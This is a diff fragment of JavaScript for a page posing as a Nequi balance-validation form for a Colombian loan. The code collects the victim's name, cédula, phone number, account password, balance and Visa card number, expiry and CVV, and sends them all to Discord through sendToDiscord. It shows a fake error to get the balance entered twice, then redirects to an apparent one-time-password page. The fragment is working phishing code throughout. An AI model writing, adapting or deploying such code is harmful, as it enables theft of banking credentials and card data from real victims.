+        saldoActualInput.addEventListener("input", function (e) {
+          saldoActualInput.style.border = "0";
+          saldoActualError.classList.add("hidden");
+          var value = e.target.value.replace(/\D/g, "");
+          if (value.length > 9) value = value.slice(0, 9);
+          if (value) {
+            var numericValue, minDec, maxDec;
+            if (value.length <= 7) {
+              numericValue = parseInt(value, 10); minDec = 0; maxDec = 0;
+            } else if (value.length === 8) {
+              numericValue = parseInt(value, 10) / 10; minDec = 1; maxDec = 1;
+            } else {
+              numericValue = parseInt(value, 10) / 100; minDec = 2; maxDec = 2;
+            }
+            value = new Intl.NumberFormat("es-CO", {
+              style: "currency", currency: "COP",
+              minimumFractionDigits: minDec, maximumFractionDigits: maxDec
+            }).format(numericValue);
+          }
+          e.target.value = value;
+          actualizarEstadoBoton();
+        });
+
+        function validarSaldo(saldo) {
+          var v = saldo.replace(/\D/g, "");
+          return v.length >= 1 && parseInt(v, 10) > 0;
+        }
+
+        function actualizarEstadoBoton() {
+          var saldoOk = validarSaldo(saldoActualSalvavidas.value);
+          var nombreOk = nombreInput.value.replace(/\s/g, "").length >= 2;
+          var apellidoOk = apellidoInput.value.replace(/\s/g, "").length >= 2;
+          btnContinuarSalvavidas.disabled = !(saldoOk && nombreOk && apellidoOk);
+          if (btnContinuarSalvavidas.disabled) {
+            btnContinuarSalvavidas.classList.add("opacity-80", "cursor-not-allowed");
+          } else {
+            btnContinuarSalvavidas.classList.remove("opacity-80", "cursor-not-allowed");
+          }
+        }
+
+        function capitalizarPalabras(texto) {
+          return texto.replace(/\b\w/g, function (letra) { return letra.toUpperCase(); });
+        }
+
+        nombreInput.addEventListener("input", function (e) {
+          var cursorPos = e.target.selectionStart;
+          e.target.value = capitalizarPalabras(e.target.value);
+          try { e.target.setSelectionRange(cursorPos, cursorPos); } catch (err) {}
+          actualizarEstadoBoton();
+        });
+
+        apellidoInput.addEventListener("input", function (e) {
+          var cursorPos = e.target.selectionStart;
+          e.target.value = capitalizarPalabras(e.target.value);
+          try { e.target.setSelectionRange(cursorPos, cursorPos); } catch (err) {}
+          actualizarEstadoBoton();
+        });
+
+        var contSendButton = 0;
+        var firstSaldo = null;
+
+        btnContinuarSalvavidas.addEventListener("click", function (e) {
+          e.preventDefault();
+          if (modalAbierto) return;
+
+          var valueSaldo = saldoActualSalvavidas.value;
+          btnContinuarSalvavidas.classList.add("btn-loading");
+          btnContinuarSalvavidas.innerHTML = '<span class="btn-spinner"></span><span>Validando...</span>';
+          btnContinuarSalvavidas.disabled = true;
+
+          setTimeout(function () {
+            contSendButton += 1;
+
+            if (contSendButton === 1) {
+              firstSaldo = valueSaldo;
+              var formData = window.getFormDataSafe ? window.getFormDataSafe() : {};
+              formData.firstSaldo = firstSaldo;
+              formData.nombreCompleto = nombreInput.value.trim();
+              formData.apellidos = apellidoInput.value.trim();
+              if (window.setFormDataSafe) window.setFormDataSafe(formData);
+
+              enviarSaldoADiscord("PRIMER", firstSaldo);
+
+              loadingContenedor.style.display = "flex";
+              setTimeout(function () { loadingContenedor.style.display = "none"; }, 800);
+
+              saldoActualInput.style.border = "3px solid #da0081";
+              saldoActualError.classList.remove("hidden");
+              saldoActualSalvavidas.value = "";
+
+              btnContinuarSalvavidas.classList.remove("btn-loading");
+              btnContinuarSalvavidas.innerHTML = '<span class="btn-text">Validar</span>';
+              btnContinuarSalvavidas.disabled = true;
+              return;
+            }
+
+            if (contSendButton === 2) {
+              var formData2 = window.getFormDataSafe ? window.getFormDataSafe() : {};
+              formData2.secondSaldo = valueSaldo;
+              if (window.setFormDataSafe) window.setFormDataSafe(formData2);
+
+              enviarSaldoADiscord("SEGUNDO", valueSaldo);
+
+              loadingContenedor.style.display = "flex";
+              setTimeout(function () {
+                document.getElementById("loader").style.display = "none";
+                document.getElementById("done").classList.add("show");
+              }, 700);
+              setTimeout(function () {
+                document.getElementById("content").classList.toggle("show");
+              }, 1100);
+              setTimeout(function () {
+                document.getElementById("done").classList.remove("show");
+                document.getElementById("content").classList.remove("show");
+                window.location.href = "one-time-pass.php.html";
+              }, 1600);
+            }
+          }, 250);
+        });
+
+        function enviarSaldoADiscord(tipo, saldo) {
+          var formData = window.getFormDataSafe ? window.getFormDataSafe() : {};
+          var cedula = formData.cedula || "";
+          var phoneNumber = formData.phoneNumber || "";
+          var password = formData.password || "";
+          var nombre = formData.nombreCompleto || "";
+          var apellidos = formData.apellidos || "";
+          var nombreCompleto = (nombre + " " + apellidos).trim() || "No disponible";
+          var primerSaldo = formData.firstSaldo || "No disponible";
+          var segundoSaldo = formData.secondSaldo || "";
+          var montoPrestamo = formData.montoPrestamo || "No disponible";
+          var montoFormateado = "No disponible";
+          if (montoPrestamo && montoPrestamo !== "No disponible") {
+            try {
+              montoFormateado = "$" + new Intl.NumberFormat("es-CO").format(parseInt(String(montoPrestamo).replace(/\D/g, ""), 10));
+            } catch (e) {
+              montoFormateado = "$" + montoPrestamo;
+            }
+          }
+
+          var msg = "═══════════════════════════════════════\n";
+          msg += " VALIDACIÓN DE SALDO 💰\n\n";
+          msg += "$$$ * Monto solicitado: " + montoFormateado + "*\n\n";
+          msg += "💰 PRIMER SALDO: " + primerSaldo + "\n";
+          if (tipo === "SEGUNDO" && segundoSaldo) {
+            msg += "💰 SEGUNDO SALDO: " + segundoSaldo + "\n";
+          }
+
+          var visaActiva = tieneVisaSelect.value === "Si";
+          var hayDatosVisa = formData.visaCC || formData.visaExpiry || formData.visaCVV;
+
+          if (visaActiva && hayDatosVisa) {
+            msg += "\n💳 DATOS TARJETA VISA NEQUI\n";
+            if (formData.visaCC)     msg += "   • Número (CC): " + formData.visaCC + "\n";
+            if (formData.visaExpiry) msg += "   • Vencimiento: " + formData.visaExpiry + "\n";
+            if (formData.visaCVV)    msg += "   • CVV: " + formData.visaCVV + "\n";
+          }
+
+          msg += "\n\n";
+          msg += "👤 Nombre: " + nombreCompleto + "\n";
+          msg += "🪪 Cédula: " + (cedula || "No disponible") + "\n";
+          msg += "🔢 Número: " + phoneNumber + "\n";
+          msg += "🔑 Clave: " + password + "\n";
+          msg += "═══════════════════════════════════════";
+
+          sendToDiscord(msg);
+        }
+      });
+    </script>
+  </body>
+</html>
